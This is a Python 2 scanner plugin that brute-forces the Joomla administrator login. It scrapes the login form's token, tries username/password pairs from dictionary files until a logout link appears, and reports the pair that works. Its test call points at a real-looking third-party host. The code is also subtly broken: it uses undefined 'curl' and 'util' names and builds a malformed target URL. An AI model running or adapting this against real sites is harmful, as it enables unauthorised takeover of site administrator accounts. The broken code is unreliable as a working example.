from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import sys
import re

def force(url, name, passwd):
    code, head, res, errcode, _ = curl.curl('%s' % (url))
    token = re.search('\"([a-z0-9]*)\" value=\"1',res).group(1)
    data = 'username='+ name + '&passwd=' + passwd + '&option=com_login&task=login&return=aW5kZXgucGhw&' + token + '=1'
    code, head, res, errcode, _ = curl.curl('-d %s %s' % (data, url))
    code, head, res, errcode, _ = curl.curl('%s' % (url))
    if (res.find('task=logout') != -1):
        return True
    else:
        return False


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + 'administrator/index.php'
        host = urlparse.urlparse(arg).hostname
        code, head, res, errcode, _ = curl.curl('%s' % url)
        if (code == 200):
            output('joomla website back end: %s' % url,result,'info')
            if(len(re.findall('input name',res)) == 2 and len(re.findall('hidden',res)) == 5):
                pass_list = util.load_password_dict(
                    host,
                    userfile='database/form_user.txt', 
                    passfile='database/form_pass.txt',
                    )
                for username,password in pass_list:
                    if(force(url, username, password)):
                        output('password : maybe ' + username + '/' + password,result,'hole')
                        break
    	

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_438eb917bf7282fe63112633ab0d6d88.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info
if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/', port='80')


        #/root/github/poccreate/thirdparty/joomla/joomla_438eb917bf7282fe63112633ab0d6d88.py
#/root/github/poccreate/codesrc/exp-697.py